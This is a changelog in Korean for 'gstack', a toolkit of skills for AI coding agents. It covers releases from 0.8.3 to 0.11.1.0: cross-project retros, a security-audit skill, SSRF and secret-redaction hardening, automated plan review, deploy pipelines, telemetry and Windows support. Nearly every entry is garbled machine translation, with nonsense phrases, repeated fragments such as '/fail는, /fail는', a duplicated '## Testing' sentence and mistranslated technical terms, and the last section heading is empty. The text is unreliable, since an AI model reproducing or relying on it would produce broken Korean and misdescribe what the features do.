### 추가

- **모든 플랜 파일은 검토 상태를 보여줍니다.** 플랜 모드를 종료하면 플랜 파일이 자동으로 `GSTACK REVIEW REPORT` 섹션을 가져옵니다. 아직 공식 리뷰를 실행하지 못하더라도. 이전으로, 이 섹션은 `/plan-eng-review`, `/plan-ceo-review`, `/plan-design-review`, `/codex review`를 실행한 후만 등장했습니다. 이제 당신은 항상 당신이 서있는 곳을 알고 있습니다. 리뷰가 실행되지 않은 경우, 다음을 수행해야 할 것입니다.

## [0.11.1.0] - 2026-03-22. 글로벌 레트로 : 크로스 - 프로젝트 AI 코딩 복도

### 추가

- **`/retro global`. 1개의 보고에 있는 각 프로젝트의 맞은편에 발송되는 모든 것을 보십시오.**는 Claude Code, Codex CLI, 그리고 Gemini CLI 회의를 검사하고, 각을 git repo, 리모트에 의해 deduplicates에, 그 후에 그들 전부의 전체적인 개조를 실행합니다. 세계적인 선박 streak, 개인적인 기여, 및 크로스툴 사용법 본을 가진 컨트 엇바꾸기 미터, per-project 고장. 2 주 전망을 위한 `/retro global 14d`를 달립니다.
- **글로벌 복고풍의 퍼 프로젝트 개인 공헌.** 글로벌 복고풍의 각 프로젝트는 YOUR 커밋, LOC, 키 작업, commit 타입 믹스, 가장 큰 배를 보여줍니다. 팀 총과 분리. 솔로 프로젝트는 "솔로 프로젝트. 모든 커밋은 당신의 것입니다." 팀 프로젝트는 세션 카운트 만 터치하지 않았습니다.
- **`gstack-global-discover`. 글로벌 복고후생의 엔진.** 기계에 모든 AI 코딩 세션을 찾아서 git repos에 작업 디렉터를 해결하고, SSH/HTTPS를 dedup에 대한 원격을 정상화하고, JSON를 구조화했습니다. gstack을 가진 바이너리 배를 컴파일했습니다. no `bun` 가동 시간 필요.

### 고정

- **Discovery 스크립트는 세션 파일의 첫 번째 KB만 읽습니다.** 대신 메모리에 멀티MB JSONL 성적을 적재하는 것. 광대한 코딩 역사를 가진 기계에 OOM를 방지합니다.
- **Claude Code 세션 카운트가 현재 정확합니다.** 프로젝트 디렉토리의 모든 JSONL 파일을 이전으로 계산했습니다. 이제는 시간 창 내에서 수정된 파일만 계산합니다.
- **주간 창 (`1w`, `2w`)는 지금 중화점입니다**는 일 창 같이, 그래서 `/retro global 1w`와 `/retro global 7d` 생성 일관된 결과를 일으킵니다.

## [0.11.0.0] - 2026-03-22. /cso: 제로노이즈 보안 감사

### 추가

- **`/cso`. 최고 보안 책임자.** 전체 코디베이스 보안 감사 : OWASP 상위 10, STRIDE 위협 모델링, 공격 표면 매핑, 데이터 분류, 그리고 의존성 검사. 각 발견에는 엄격성, 신뢰 점수, 콘크리트 악용 시나리오 및 재약 옵션이 포함되어 있습니다. linter가 아닙니다. 위협 모델.
- **Zero-noise false 긍정적인 필터링.** 17개의 단단한 배설물 및 9개의 우선권은 Anthropic의 안전 검토 방법론에서 적응했습니다. DOS는 발견이 아닙니다. 시험 파일은 지상을 공격하지 않습니다. React는 과태에 의해 XSS 안전입니다. 각 결과는 8/10+ 신뢰를 보고하기 위하여 점수를 매기야 합니다. 결과: 3개의 진짜 발견, 3개의 진짜 + 12 이론적인.
- **인증 및 인증** 각 후보자는 발견과 거짓 긍정적인 규칙을 볼 수 있는 신선한 미시간 에이전트에 의해 확인됩니다. no 처음 검사에서 bias를 고정. 독립적인 검증이 침묵적으로 떨어질 것이라는 점을 찾아내기.
- **`browse storage` 이제는 비밀을 자동으로 적습니다.** 토큰, JWTs, API 키, GitHub PATs, Bearer 토큰은 키 이름과 값 접두사 모두에 의해 검출됩니다. 비밀 대신 `[REDACTED. 42 chars]`를 참조하십시오.
- **Azure 메타데이터 엔드포인트 차단.** SSRF `browse goto`의 보호는 이제 3개의 중요한 클라우드 공급자 (AWS, GCP, Azure)를 포함합니다.

### 고정

- **`gstack-slug`는 포탄 주입에 대하여 강하게 했습니다.** 산출은 알파누메, 도트, 돌진 및 underscore에 단지 만족했습니다. 나머지 `eval $(gstack-slug)` 외침은 `source <(...)`에 migrated.
- **DNS 재조합 보호.** `browse goto` 이제 호스트명을 IP로 바꾸고 메타데이터 차단리스트에 대한 확인을 합니다. 초기에 안전한 IP로 해결되는 공격을 방지하고, 클라우드 메타데이터 엔드포인트로 전환합니다.
- **Concurrent 서버 시작 레이스 고정.** 독점적인 lockfile은 이전 서버를 죽이고 새 것을 동시에 시작해서, orphaned Chromium 과정을 떠나는 두 CLI invocations를 막습니다.
- **Smarter 저장 redaction.** Key matching now uses underscore-aware boundaries (원은 `keyboardShortcuts` 또는 `monkeyPatch`). 값 감지는 AWS, Stripe, Anthropic, Google, Sendgrid 및 Supabase 키 접목을 커버하기 위해 확장되었습니다.
- **CI 워크플로 YAML lint 오류 고정.**

### 기여자

- **커뮤니티 PR 문서화** CONTRIBUTING.md.
- **저장 redaction 시험 적용.** 4개의 새로운 테스트는 열쇠 근거하고 가치 근거한 탐지를 위한.

## [0.10.2.0] - 2026-03-22. Autoplan 깊이 수정

### 고정

- **`/autoplan` 이제는 한 라이너에 모든 압축을 대신하는 전체 심층적인 리뷰를 생성합니다.** autoplan이 "auto-decide"라고 말했을 때 "decide FOR 원리를 사용하여 사용자"를 의미한다. 그러나 에이전트는 "skip the analysis totally."라고 해석했습니다. 이제 autoplan은 명시적으로 계약을 정의합니다. 자동 변형은 심판을 대체하고 분석하지 않습니다. 모든 리뷰 섹션은 여전히 읽기, 다이어그램 및 평가됩니다. 수동으로 각 검토를 실행하는 것과 동일한 깊이를 얻습니다.
- **CEO 및 Eng 단계에 대한 체크리스트를 실행합니다.** 각 단계는 이제 생산해야 하는 정확히 설명합니다. 우선 과제, 건축 다이어그램, 테스트 커버리지 맵, 실패 레지스트리, 디스크에 대한 artifacts. No 더 많은 "전체 깊이"가 의미하는 것을 말하는없이 전체 깊이에 파일을 따르십시오.
- **사전 게이트 검증은 출력을 건너 뛰는 것을 잡아줍니다.** 최종 승인 게이트를 제시하기 전에 autoplan은 이제 필요한 출력의 구체적인 체크리스트를 확인합니다. 문이 열리기 전에 아이템을 미스링 (최대 2 개의 retries, 그 다음 날).
- **시험 검토는 결코 건너 뛰지 않을 수 있습니다.** Eng review's test diagram 섹션. 가장 높은 값 출력. 명시적으로 표시된 NEVER SKIP OR COMPRESS 실제 디프를 읽는 지침과 함께, 모든 코콜을 적용하고, 테스트 플랜 아트프트를 작성합니다.

## [0.10.1.0] - 2026-03-22. 시험 적용 카탈로그

### 추가

- **테스트 커버리지 감사는 지금 어디서나 작동합니다. 계획, 배 및 리뷰.** 코칭 방법론(ASCII 다이어그램, 품질 득점, 간격 검출)은 `/plan-eng-review`, `/ship`, `/review`, `/review`를 통해 공유됩니다. 플랜 모드는 코드를 작성하기 전에 플랜에 누락된 테스트를 추가합니다. 배 모드는 갭을 위한 자동 생성 시험을 제공합니다. 검토 모드는 사전 착륙 검토 도중 시험에 시험된 경로를 찾아냅니다. 1개의 방법론, 3개의 문맥주 사본.
- **`/review` 단계 4.75. 시험 적용 도표.** 코드를 착륙하기 전에, `/review`는 이제 각 변경된 코콜을 추적하고 테스트하는 것을 보여주는 ASCII 적용 지도를 생성합니다 (★★★/★★/★) 그리고 아닙니다 (GAP). 가파스는 INFORMATIONAL의 발견이 수정 첫번째 교류를 따르는 것을. 당신은 거기 누락한 시험을 생성할 수 있습니다.
- **E2E 테스트 권고사항 내장.** 적용 감사는 E2E 테스트 (일반 사용자 흐름, 단위 테스트가 그것을 커버 할 수없는 통합) 대 단위 테스트를 추천 할 때 알고 있으며, eval 적용이 필요한 LLM 프롬프트 변경. No 뭔가 통합 테스트가 필요한지 더 추측.
- **회귀 검출 철 규칙.** 코드가 기존 동작을 변경할 때 gstack는 항상 회귀 테스트를 작성합니다. no 요청, no 건너뛰기. 변경하면 테스트합니다.
- **`/ship` 실패 삼기.** 테스트가 배 동안 실패할 때, 적용 감사는 각 실패를 분류하고 오류 출력을 덤프 대신 다음 단계를 추천합니다.
- **테스트 프레임 워크 자동 감지.** 테스트 명령을 위해 CLAUDE.md를 먼저 읽어, 프로젝트 파일 (package.json, Gemfile, pyproject.toml, 등)에서 자동 탐지합니다. 어떤 기구도 작동하십시오.

### 고정

- **gstack no `origin` 리모트 없이 더 긴 repo에서 충돌.** `gstack-repo-mode` 돕는 지금 우아하게 끊긴 먼, 벌거벗은 repos 및 빈 git 산출을 취급합니다. preamble를 충돌하는 대신 `unknown` 형태에 과태.
- **`REPO_MODE` 디폴트가 도움이 될 때 제대로 동작합니다.** 이전의 빈 응답 `gstack-repo-mode` 왼쪽 `REPO_MODE` unset, downstream 템플릿 오류를 발생.

## [0.10.0.0] - 2026-03-22. 오토플랜

### 추가

- **`/autoplan`. 한 명령, 완전히 검토 된 계획.** 손은 거친 계획이고 완전 CEO → 디자인 → eng 검토 파이프라인을 자동적으로 실행합니다. 디스크 (매우 각 검토를 실행하기 때문에 동일한 의장, 동일한 깊이)에서 실제적인 검토 기술 파일을 읽고 6개의 암호로 고쳐 쓴 원리를 사용하여 중간 결정: 완전한, boil 호수, pragmatic, DRY, clever에, 행동을 향한 bias에 명시하십시오. 맛 결정 (닫는 접근, 국경 범위, codex는 마지막 승인에 반대합니다). 당신은, override, interrogate, 또는 revise를 승인합니다. 복원 지점을 저장하므로 스크래치에서 다시 실행할 수 있습니다. `/ship`의 대쉬보드와 호환되는 리뷰 로그를 작성합니다.

## [0.9.8.0] - 2026-03-21. 배포 파이프 라인 + E2E 성능

### 추가

- **`/land-and-deploy`. merge, 배포, 하나의 명령에서 확인.** `/ship`가 꺼져 있는 곳을 지나갑니다. PR를 합리적으로 하고, CI를 배치하고, 워크플로우를 배치하고, 생산 URL에 대한 캐러리 검증을 실행합니다. 배포 플랫폼(Fly.io, Render, Vercel, Netlify, Heroku, GitHub Actions)를 자동 탐지합니다. 각 실패 시점에서 다시 시작하십시오. "PR에서 승인된 생산에 한 명령을 "PR"로 지정했습니다.
- **`/canary`. 포스트 배치 감시 루프.** 콘솔 오류, 성능 회귀 및 검색 데몬을 사용하여 페이지 실패에 대한 라이브 앱을보십시오. 주기적인 스크린 샷을 가져 와서 사전 배포 기본에 대한 비교 및 anomalies에 경고합니다. 배포 후 `/canary https://myapp.com --duration 10m`를 실행하십시오.
- **`/benchmark`. 성능 회귀 탐지.** 페이지로드 시간, 핵심 웹 비틀 및 자원 크기에 대한 기본 구성. 전에 비교/after 각 PR. 시간이 지남에 성능 동향을 추적. 코드 검토 놓는 번들 크기 회귀를 캐치.
- **`/setup-deploy`. 한 번 배치 구성.**는 배포 플랫폼, 생산 URL, 건강 체크 엔드포인트를 탐지하고 상태 명령을 배치합니다. config를 CLAUDE.md로 작성하여 모든 미래 `/land-and-deploy`가 완전히 자동 실행됩니다.
- **`/review`는 이제 성능 및 번들 충격 분석이 포함되어 있습니다.** 정보 검토는 무거운 의존성, 누락된 게으른 선적, 동시 스크립트 태그 및 번들 크기 회귀를 위한 검사를 통과합니다. Catches moment.js-instead-of-date-fns 전에 발송합니다.

### 변경

- **E2E 테스트는 지금 3-5x를 빨리 실행합니다.** 구조 테스트 default Sonnet (5x 빠르, 5x 저렴). 품질 테스트 (식물 벌레 검출, 디자인 품질, 전략적인 검토) Opus에 체재. 전체 스위트는 50-80 분에서 ~15-25 분으로 떨어졌습니다.
- **`--retry 2` 모든 E2E 테스트.** 플랩 테스트는 실제 실패를 마커하지 않고 두 번째 기회를 얻습니다.
- **`test:e2e:fast` 층.** 빠른 피드백 (~5-7 분)을 위한 8개의 가장 느린 Opus 질 시험을 제외하십시오. 급속한 여정을 위한 `bun run test:e2e:fast`를 실행하십시오.
- **E2E 타이밍 telemetry.** 각 시험은 지금 `first_response_ms`, `max_inter_turn_ms`, 그리고 `model`를 기록합니다. 평행한이 실제로 작동한다는 것을 벽 시 타이밍 쇼.

### 고정

- **`plan-design-review-plan-mode` no 더 긴 경주.** 각 시험은 자체 격리한 tmpdir를 가져옵니다. no 더 많은 동시 시험은 각 다른 작업 디렉토리를 polluting.
- **`ship-local-workflow` no 더 긴 폐기물 6 의 15 회전.** Shipflow steps는 테스트에서 대신 에이전트가 700+ 라인 SKILL.md를 실행 시간에 읽는 대신 줄어들고 있습니다.
- **`design-consultation-core` no 더 긴 동의 섹션에 실패.** "Colors"는 "Color", "Type System"과 일치 "Typography"를 일치합니다. 모든 7 개의 섹션과 일치하는 퓨지 문법 기반이 필요합니다.

## [0.9.7.0] - 2026-03-21. 계획 파일 검토 보고서

### 추가

- **모든 계획 파일은 이제 리뷰가 실행되는 것을 보여줍니다.** 어떤 검토 기술 끝 (`/plan-ceo-review`, `/plan-eng-review`, `/plan-design-review`, `/codex review`) 후에, 마진 테이블은 계획 파일 자체에 부합됩니다. 각 검토 방아쇠 명령, 목적, 뛰기 조사, 상태 및 발견 요약을 보여주기. 계획이 대화 기록을 검사하지 않고 한 눈에 검토 상태를 볼 수 있는 어떤 독서든지.
- **지금 리뷰는 풍부한 데이터를 캡처합니다.** CEO 리뷰 로그 범위 제안 수 (proposed/accepted/deferred), eng 후기 로그 총 문제 발견, 리뷰 로그 이전 → 후 점수, 그리고 코덱 리뷰 로그 얼마나 많은 발견이 고정 된지. 플랜 파일 보고서는이 필드를 직접 사용합니다. no 부분 메타 데이터에서 더 많은 추측.

## [0.9.6.0] - 2026-03-21. 자동 교환 Adversarial 검토

### 변경

- **이제는 diff 크기로 자동으로 확장됩니다.** 작은 디프 (<50 라인) 건너뛰기 adversarial 검토 전적으로. no는 typo 수정에 시간을 낭비했습니다. 중간 디프 (50-199 라인)는 Codex (또는 Claude adversarial subagent if Codex 설치되지 않습니다)에서 크로스 모델 adversarial 도전을 얻습니다. 큰 디프 (200 + 라인)는 모든 4 패스를 얻습니다: Claude 구조, /fail는, /fail는, /fail는, /fail를 가진 비상사태를, 그것을 필요로 합니다.
- **Claude 이제는 모험 모드가 있습니다.** no 체크리스트 바이어와 함께 신선한 Claude 에이전트은 공격자처럼 코드를 검토합니다. 구조화 된 검토가 놓을 수 있다는 점 가장자리 케이스, 인종 조건, 보안 구멍 및 침묵 데이터 손상을 찾는다. 찾기는 FIXABLE (자동 고정) 또는 INVESTIGATE (당신의 전화)로 분류됩니다.
- **"Codex Review" 대신 "Adversarial"의 검색 대시보드를 표시합니다.** 대시보드 행은 새로운 멀티 모델 리얼리티를 반영합니다. 이 트랙은 실제로 ran, 단지 Codex가 아닌.

## [0.9.5.0] - 2026-03-21. 빌더 에스토스

### 추가

- **ETHOS.md. gstack의 건축가 철학은 한 문서에 있습니다.** 4가지 원칙: 골든 에이지(AI 압축 비율), 호수(정밀은 저렴합니다), 건물(지식 층)의 검색, 자신을 위한 빌드하기 전에 검색. 이것은 각 워크플로 기술 참조가 진실의 철학적 소스입니다.
- **모든 워크플로우 기술이 권장하기 전에 검색합니다.** 인프라 패턴, 통화 접근, 또는 프레임 워크 별 솔루션 제안하기 전에, gstack는 실행 시간이 내장되어 패턴이 현재 가장 잘 연습인지 여부를 확인합니다. 지식의 세 층. 시도 및 레이 (Layer 1), 새로운 플랫폼 (Layer 2) 및 첫 번째 선구자 (Layer 3). 모든 위 가장 가치있는 통찰력과 함께.
- **Eureka 순간.** 처음에는 기존 지혜가 잘못되었는지 알 수 있습니다. gstack 이름은 그것을 축하하고, 그것을 로그합니다. 주간 `/retro`는 이제 이러한 통찰력을 표면으로 다른 사람들 zagged 동안 프로젝트를 지깅 할 수 있습니다.
- **`/office-hours` 조경 인식 단계 추가.** 문제 해결을 통해 문제를 이해하기 전에, 도전적인 건물 앞에, gstack는 어떤 세계가 생각하는지 검색합니다. 그 후에 세 층의 합성을 실행하여 기존의 지혜가 특정 사례에 대해 잘못 될 수 있습니다.
- **`/plan-eng-review` 검색 체크를 추가합니다.** Step 0 이제 건축 패턴을 현재의 모범 사례와 플래그 맞춤형 솔루션에 대한 정의를 정의합니다.
- **`/investigate` hypothesis 실패에 대한 검색.** 첫 번째 디버깅 hypothesis가 잘못되었을 때, gstack는 다시 추측하기 전에 정확한 오류 메시지 및 알려진 프레임 워크 문제를 검색합니다.
- **`/design-consultation` 3 층 종합.** 경쟁적인 연구는 지금 구조상 층 1/2/3 기구를 사용하여 당신의 제품이 범주 규범에서 끊기지 않는 것을 찾아내기 위하여.
- **CEO 리뷰는 `/office-hours`로 핸딩할 때 상황에 맞는다.** `/plan-ceo-review`가 `/office-hours`를 처음 실행할 때, 이제 시스템 감사 결과와 어떤 토론을 지금까지 저장합니다. 다시 와서 다시 시작하면 `/plan-ceo-review`, 그것은 자동으로 그 맥락을 선택합니다. no는 찰상에서 더 많은 시작.

## [0.9.4.1] - 2026-03-20

### 변경

- **`/retro` no 더 긴 나그는 PR 크기에 관하여.** 복고풍은 여전히 PR 크기 분포 (Small/Medium/Large/XL) 중립 자료로, 그러나 no 더 긴 깃발 XL는 문제로 또는 그(것)들을 나누는 것을 추천합니다. AI 리뷰는 피로하지 않습니다. 일의 단위는 특징, diff 아닙니다입니다.

## [0.9.4.0] - 2026-03-20. Codex 리뷰 Default

### 변경

- **Codex 코드 리뷰는 `/ship`와 `/review`에서 자동으로 실행됩니다.** No 더 많은 "두 번째 의견이 필요합니까?" 프롬프트 매번. Codex는 코드를 모두 리뷰합니다 (Pass/fail 게이트) 과 기본으로 모험적인 도전을 실행합니다. 첫 번째 사용자는 한 번의 선택 프롬프트를 얻습니다. 그 후, 그것은 손이 없습니다. `gstack-config set codex_reviews enabled|disabled`로 구성하십시오.
- **모든 Codex 가동 사용 최대 소모 전력.** 검토, adversarial, and consulting mode all use `xhigh` reasoning 노력. AI가 코드를 검토 할 때, 당신은 가능한 한 열심히 생각하고 싶어.
- **Codex 검토 오류는 대쉬보드를 손상할 수 없습니다.** Auth 실패, 타임아웃, 빈 응답은 이제 로깅 결과 전에 감지됩니다. 그래서 검토 읽음 대시 보드는 거짓 "수입"입을 결코 보여줍니다. Adversarial stderr는 별도로 캡처됩니다.
- **Codex 리뷰 로그에는 commit 해시가 포함되어 있습니다.** Staleness detection는 Codex 리뷰에 대해 정확히 작동하며 eng/CEO/design 리뷰와 동일한 커밋 트랙 동작과 일치합니다.

### 고정

- **Codex-for-Codex 재순환 방지.** gstack가 Codex CLI (`.agents/skills/`) 안에 실행될 때, Codex 검토 단계는 완전하게 벗겨집니다. no 사고 무한한 반복.

## [0.9.3.0] - 2026-03-20. Windows 지원

### 고정

- **gstack 이제 Windows 11에서 작동합니다.** 설정 no Playwright를 확인할 때 더 긴 걸림새, 검색 서버는 Node.js를 Bun의 파이프 핸들 버그를 Windows ([bun#4253(으)로](https://github.com/oven-sh/bun/issues/4253))에 작동하기 위하여 Node.js로 다시 떨어졌습니다. macOS와 Linux는 완전하게 비범성 입니다.
- **Windows에서 경로 처리 작업.** 모든 하드코드 `/tmp` 경로와 유닉스 작풍 경로 분리기는 이제 새로운 `platform.ts` 단위를 통해 플랫폼 인식 동등한 것을 이용합니다. 경로 traversal 보호는 Windows backslash 분리기로 제대로 작동합니다.

### 추가

- **Bun API 폴리필 Node.js.** 검색 서버가 Node.js에서 Windows에서 실행될 때, 겸용성 층은 `Bun.serve()`, `Bun.spawn()`, `Bun.spawnSync()`, `Bun.sleep()` 동등한 것 제공합니다. 완전히 시험해.
- **Node 서버 빌드 스크립트.** `browse/scripts/build-node-server.sh`는 Node.js, stubs `bun:sqlite`를 위해 서버를 전달하고, polyfill를 주사합니다. `bun run build` 도중 모든 자동화해.

## [0.9.2.0] - 2026-03-20. Gemini CLI E2E 시험

### 추가

- **Gemini CLI는 이제 종료됩니다.** 2 E2E 테스트는 gstack 기술이 Google의 Gemini CLI (`gemini -p`)에 의해 보류될 때 확인한다. `gemini-discover-skill` 테스트는 `.agents/skills/`에서 기술 발견을 확인하고 `gemini-review-findings`는 gstack-review를 통해 가득 차있는 코드 검토를 실행합니다. 둘 다 앵그니의 스트림 json NDJSON 산출과 궤도 token 사용법.
- **Gemini JSONL 10 단위 테스트를 가진 파서.** `parseGeminiJSONL`는 모든 Gemini 사건 유형 (init, 메시지, tool_사용, 도구_result, 결과)를 모형 입력을 위해 몹시 파싱으로 취급합니다. 파서는 CLI를 붙일 없이 순수한 기능, 자주적으로 시험할 수 있습니다.
- **`bun run test:gemini`** 및 **`bun run test:gemini:all`**는 Gemini E2E를 실행하는 스크립트를 자주적으로 테스트합니다. Gemini 테스트는 `test:evals` 및 `test:e2e` 총 스크립트에 포함됩니다.

## [0.9.1.0] - 2026-03-20. Adversarial Spec 검토 + 기술 체인링

### 추가

- **당신의 디자인 docs 이제는 당신이 그들을 볼 전에 스트레스 테스트.** `/office-hours`를 실행할 때, 독립적인 AI 검토자는 완전한, 견실함, 명확성, 범위 주름 및 우아함을 위한 당신의 디자인 doc를 검사합니다. 3개의 둥근까지. 당신은 질 점수 (1-10)를 얻고 무엇이 붙잡고 고쳐진 요약을 얻습니다. approve가 이미 생존한 adversarial 검토가 있는 문서.
- **뇌하수 중에 비주얼 와이어 프레임.** UI 아이디어, `/office-hours`는 이제 프로젝트의 디자인 시스템 (DESIGN.md에서) 및 스크린 샷을 사용하여 거친 HTML 와이어 프레임을 생성합니다. 당신은 당신이 그것을 코딩 한 후 여전히 생각하고있는 동안 디자인하는 것을 볼 수 있습니다.
- **기술이 서로에게 도움이 됩니다.** `/plan-ceo-review`와 `/plan-eng-review`는 당신이 달리는 `/office-hours`에서 이득이 첫째로 제안할 때 검출합니다. 스위치, 쇠퇴에 1 비누를 전환하는 것은. 당신이 CEO 검토 도중 잃는 것처럼, 그것은 부드럽게 뇌하수체를 첫째로 건의할 것입니다.
- **Spec 검토 미터.** 모든 청약 검토 로그 반복, 문제 발견/fixed, 및 품질 점수 `~/.gstack/analytics/spec-review.jsonl`. 시간이 지남에 따라 디자인 문서가 더 나은 얻은지 볼 수 있습니다.

## [0.9.0.1] - 2026-03-19

### 변경

- **Telemetry opt-in 이제 기본적으로 커뮤니티 모드.** 처음 프롬프트는 "Help gstack get better!" (현실 모드와 안정된 장치 ID 추세 추적)를 요청합니다. 당신이 쇠퇴하면, 익명 모드 (no unique ID, 카운터)와 두 번째 기회를 얻습니다. 당신의 선택을 어느 방법로 재구성하십시오.

### 고정

- **플랜 모드 중에 로그와 원격 측정을 검토합니다.** 플랜 모드에서 `/plan-ceo-review`, `/plan-eng-review`, `/plan-design-review`를 실행할 때, 리뷰 결과는 디스크에 저장되지 않았습니다. 그래서 대쉬보드는 stale 또는 누락된 항목을 검토 완료했습니다. 동일한 문제는 각 기술 끝에 기록한 원격 측정값을 영향을 미쳤습니다. 이제 모두 계획 모드에서 안정적으로 작동합니다.

## [0.9.0] - 2026-03-19. Codex, Gemini CLI, Cursor에서 작동

**gstack는 AI를 지원하는 모든 AI 에이전트에 지금 작동합니다.** 설치 한 번, Claude Code, OpenAI Codex CLI, Google Gemini CLI, 또는 Cursor에서 사용. 모든 21 기술은 `.agents/skills/`에서 사용할 수 있습니다. `./setup --host codex` 또는 `./setup --host auto`를 실행하고 에이전트가 자동으로 발견합니다.

- **1개의 설치, 4개의 에이전트.** Claude Code는 `.claude/skills/`에서 읽습니다, 다른 모든 것은 `.agents/skills/`에서 읽습니다. 동일한 기술, 동일한 신속한, 각 주인을 위해 적응시켰습니다. 걸이 근거한 안전 기술 (수동, 동결, 감시)는 걸이 대신에 인라인 안전 자문 맹세합니다 -- 그들은 어디에나 작동합니다.
- **자동 탐지.** `./setup --host auto`는 당신이 설치하고 둘 다 놓는 에이전트을 검출합니다. 이미 Claude Code가 있습니까? 그것은 아직도 동일하게 작동합니다.
- **Codex-adapted 산출.** Frontmatter는 이름 + 묘사 (Codex는 허용한 도구 또는 걸이를 필요로 하지 않습니다)에 줄무늬를 붙입니다. 경로는 `~/.claude/`에서 `~/.codex/`에 rewritten입니다. `/codex` 기술은 자체가 Codex 산출에서 제외됩니다 -- 그것은 Claude 감싸는 `codex exec`의 주위에, 각자 철자일 것입니다.
- **CI 호스트 모두 체크 합니다.** 신선한 체크는 이제 Claude와 Codex 출력을 독립적으로 검증합니다. Codex docs는 stale Claude docs와 같이 빌드를 깰 수 있습니다.

## [0.8.6] - 2026-03-19

### 추가

- **이제 어떻게 gstack을 사용했는지 볼 수 있습니다.** 실행 `gstack-analytics` 개인용 사용 대시보드를 볼 수 있습니다. 대부분의 기술을 사용하는 것은 얼마나 오래 걸리는지, 당신의 성공률. 모든 데이터는 기계에 로컬에 머물.
- **Opt-in 커뮤니티 원격 측정.** 첫 번째 실행에서 gstack 익명 사용 데이터를 공유하려는 경우 요청 (스킬 이름, 기간, 충돌 정보. 절대 코드 또는 파일 경로). "yes"을 선택하고 커뮤니티 펄스의 일부입니다. `gstack-config set telemetry off`로 언제든지 변경하십시오.
- **커뮤니티 건강 대시보드.** `gstack-community-dashboard` 을 실행하여 gstack 커뮤니티가 건물인 것을 알 수 있습니다. 가장 인기있는 기술, 충돌 클러스터, 버전 배포. 모든 Supabase에 의해 구동.
- **업데이트 체크를 통해 기본 추적 설치.** 원격 측정이 활성화되면 gstack는 업데이트 체크 중에 Supabase로 평행한 ping을 불립니다. 우리는 어떤 지연든지 추가하지 않고 설치 기초 조사를 주. 당신의 원격 측정 조정을 존중하십시오 (default off). GitHub는 1 차 버전 근원을 남아 있습니다.
- **충돌 클러스터링.** 오류는 Supabase 백엔드의 유형과 버전으로 자동으로 그룹화되어, 그래서 가장 충격적인 버그 표면이 먼저.
- **funnel 추적을 업그레이드하십시오.** 우리는 지금 얼마나 많은 사람들이 향상을 볼 수 있습니다. 실제로 업그레이드. 우리를 배 더 나은 릴리스 도움이.
- **/retro 이제 gstack 사용법을 보여줍니다.** 주간 복도에는 commit 역사와 함께 기술 사용 통계 (당신이 사용하는 기술, 얼마나 자주, 성공률)가 포함됩니다.
- **세션별 공개 마커.** 기술이 중간 실행되면 다음 invocation는 세션 만 올바르게 완성합니다. no 동시 gstack 세션 사이의 더 많은 레이스 조건.

## [0.8.5] - 2026-03-19

### 고정

- **`/retro` 이제는 전체 달력 일 수 있습니다.** 밤에 복고풍을 늦게 실행 no 더 긴 침묵으로 하루 일찍 커밋을 놓습니다. Git는 오후 11시에서 실행하면 `--since="2026-03-11"`와 같은 벌거벗은 날짜를 취급합니다. 이제 우리는 `--since="2026-03-11T00:00:00"`를 통과하여 항상 밤새부터 시작합니다. 형태 창을 비교하면 동일한 수정을 얻습니다.
- **Review log no longer breaks on branch names with `/`.** `garrytan/design-system`와 같은 branch 이름은 Claude Code가 다 선 배시 블록을 분리하여 명령 사이의 변수를 잃게 되며 실패하기 위해 실패한 검토 로그를 작성합니다. 새로운 `gstack-review-log`와 `gstack-review-read` 원자 도우미는 단일 명령에서 전체 작업을 캡슐화합니다.
- **모든 기술 템플릿은 이제 플랫폼 -agnostic입니다.** `/ship`, `/review`, `/plan-ceo-review`, `/plan-eng-review`에서 가로장 별 본 제거 (`bin/test-lane`, `.includes()`, `/plan-eng-review`, `/plan-eng-review` 등). 검토 체크리스트는 Rails, Node, Python, Django 측에 대한 예를 보여줍니다.
- **`/ship`는 CLAUDE.md를 읽어 테스트 명령을 발견합니다.** 대신 `bin/test-lane`와 `npm run test`를 하드코딩합니다. no 테스트 명령이 발견되면 사용자를 요청하고 CLAUDE.md에 대한 답변을 주장합니다.

### 추가

- **플랫폼 -agnostic 디자인 원리**는 CLAUDE.md에서 공동으로 처리했습니다. 기술은 프로젝트 구성을 읽을 필요가 있고, 결코 하드코드 프레임 워크 명령을 읽습니다.
- **`## Testing` 섹션** `/ship`의 CLAUDE.md의 **`## Testing` 섹션**의 CLAUDE.md의 `/ship`의 **`## Testing` 섹션**는 발견합니다.

## [0.8.4] - 2026-03-19

### 추가

- **`/ship` 이제 자동으로 docs를 동기화합니다.** PR, `/ship`는 단계 8.5로 `/document-release`를 실행합니다. README, ARCHITECTURE, CONTRIBUTING, CLAUDE.md는 여분 명령 없이 현재 체재합니다. No는 발송 후에 stale docs를 더 많은 것.
- **문서에 6개의 새로운 기술.** README, docs/skills.md, BROWSER.md는 이제 `/codex` (다중AI 두번째 의견), `/careful` (파괴 명령 경고), `/freeze` (직접적인 편집 자물쇠), `/guard` (전 안전 형태), `/unfreeze`, `/gstack-upgrade`를 커버합니다. 스프린트 스킬 테이블은 그것의 나머지 도구를 “Powers” 포함합니다.
- **모든 곳에서 문서화** BROWSER.md 명령표, docs/skills.md 심도, README "새로운"는 `$B handoff` 및 `$B resume`를 CAPTCHA/MFA/auth 벽에 설명합니다.
- **Proactive 제안은 모든 기술에 대해 알고 있습니다.** 루트 SKILL.md.tmpl는 `/codex`, `/careful`, `/freeze`, `/guard`, `/unfreeze`, `/gstack-upgrade`를 올바른 워크플로우 단계에서 제안합니다.

## [0.8.3] - 2026-03-19

### 추가

- **플랜 리뷰는 다음 단계로 안내합니다.** `/plan-ceo-review`, `/plan-eng-review`, 또는 `/plan-design-review`를 실행한 후, 다음을 실행하는 것에 대한 권고를 얻을 수 있습니다. eng 검토는 항상 필요한 선박 문으로 건의됩니다, 디자인 검토는 UI 변경이 검출될 때 건의되고, CEO 검토는 큰 제품 변경을 위해 연약하게 언급됩니다. No 더 많은 것은 워크플로를 혼자 기억합니다.
- **리뷰는 그들이 stale 때 알고 있습니다.** 각 리뷰는 이제 commit를 기록합니다. 대쉬보드는 현재 HEAD에 대하여 비교하고, 얼마나 많은 커밋이 탈출했는지 정확히 알려줍니다. "eng review may be stale. 13 추측 대신 검토 이후 커밋합니다.
- **`skip_eng_review`는 어디에나 존중했습니다.** 전 세계적으로 eng 검토를 선택하면 체인업 권고가 당신을 밝히지 않을 것입니다.
- **디자인 리뷰 라이트는 이제도 커밋을 추적합니다.** `/review`와 `/ship` 안쪽에 달리는 경량 디자인 체크는 가득 차있는 검토로 동일한 staleness 추적을 얻습니다.

### 고정

